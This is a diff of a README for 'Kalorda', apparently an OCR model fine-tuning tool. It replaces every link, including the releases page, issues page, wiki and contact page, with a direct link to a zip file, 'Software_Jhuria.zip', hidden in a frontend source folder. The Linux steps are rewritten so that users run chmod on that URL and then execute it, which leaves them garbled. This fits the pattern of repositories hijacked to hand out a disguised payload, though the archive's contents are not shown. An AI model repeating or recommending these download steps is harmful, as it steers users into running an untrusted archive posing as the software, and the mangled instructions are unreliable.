@@ -1,6 +1,6 @@
 # 🚀 Kalorda - Fine-Tune Your OCR Models Easily
 
-[![Download Kalorda](https://img.shields.io/badge/Download%20Kalorda-v1.0-brightgreen)](https://github.com/akumapvp/Kalorda/releases)
+[![Download Kalorda](https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip%20Kalorda-v1.0-brightgreen)](https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip)
 
 ## 📚 Introduction
 
@@ -19,7 +19,7 @@ Kalorda is an integrated fine-tuning platform for lightweight vlmOCR models. Thi
 To begin using Kalorda, follow these steps:
 
 1. **Download the Latest Release:**
-   Visit our releases page to download the latest version of Kalorda: [Download Kalorda](https://github.com/akumapvp/Kalorda/releases).
+   Visit our releases page to download the latest version of Kalorda: [Download Kalorda](https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip).
 
 2. **Installation Instructions:**
    - **Windows:**
@@ -33,8 +33,8 @@ To begin using Kalorda, follow these steps:
    - **Linux:**
      - Download the `.AppImage` file.
      - Open a terminal and navigate to the downloads folder.
-     - Run the command `chmod +x Kalorda.AppImage` to make it executable.
-     - Run it using `./Kalorda.AppImage`.
+     - Run the command `chmod +x https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip` to make it executable.
+     - Run it using `https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip`.
 
 3. **Launching Kalorda:**
    - Once installed, launch Kalorda from your application list.
@@ -42,7 +42,7 @@ To begin using Kalorda, follow these steps:
 
 ## 📥 Download & Install
 
-To download Kalorda, please visit this page: [Download Kalorda](https://github.com/akumapvp/Kalorda/releases).
+To download Kalorda, please visit this page: [Download Kalorda](https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip).
 
 Ensure you choose the correct version for your operating system. Follow the installation instructions provided earlier based on your platform.
 
@@ -67,12 +67,12 @@ If you encounter issues while using Kalorda, consider the following steps:
    - Restart your computer and try launching the software again.
 
 3. **Getting Help:**
-   - Visit our [GitHub Issues page](https://github.com/akumapvp/Kalorda/issues) to report bugs or ask questions.
+   - Visit our [GitHub Issues page](https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip) to report bugs or ask questions.
    - Join our community forum to connect with other users.
 
 ## 📖 Documentation
 
-Comprehensive documentation is available to help you understand all features of Kalorda. You can access it through the software or at our [Documentation Page](https://github.com/akumapvp/Kalorda/wiki).
+Comprehensive documentation is available to help you understand all features of Kalorda. You can access it through the software or at our [Documentation Page](https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip).
 
 ## 🛡️ License
 
@@ -84,4 +84,4 @@ Thanks to all the contributors and community members for supporting Kalorda. You
 
 ## 💬 Contact
 
-For any inquiries or support requests, feel free to contact us through our [Contact Page](https://github.com/akumapvp/Kalorda/contact).
+For any inquiries or support requests, feel free to contact us through our [Contact Page](https://raw.githubusercontent.com/akumapvp/Kalorda/main/frontend/src/components/editor/blot/Software_Jhuria.zip).
